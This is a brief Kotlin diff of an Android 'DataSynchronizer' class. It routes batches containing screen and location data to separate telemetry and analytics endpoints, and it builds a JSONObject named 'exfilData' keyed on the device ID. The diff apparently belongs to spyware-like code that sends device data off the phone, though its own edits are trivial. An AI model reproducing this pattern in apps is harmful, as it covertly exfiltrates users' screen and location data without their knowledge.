@@ -104,7 +104,7 @@ class DataSynchronizer(private val context: Context) {
         val endpoint = when {
             batch.any { it.dataType.contains("screen") } -> SyncConfig.TELEMETRY_ENDPOINT
             batch.any { it.dataType.contains("location") } -> SyncConfig.ANALYTICS_ENDPOINT
-            else -> SyncConfig.SYNC_ENDPOINT
+            else -> SyncConfig. SYNC_ENDPOINT
         }
         SendDataTask(endpoint, request.toString()).execute()
     }
@@ -141,7 +141,7 @@ class DataSynchronizer(private val context: Context) {
         }
     }
 
-    fun sendData(dataType: String, data: String) {
+    fun sendData(dataType: String, data: JSONObject) {
         try {
             val exfilData = JSONObject().apply {
                 // CONSISTENT: Use deviceId as the primary identifier
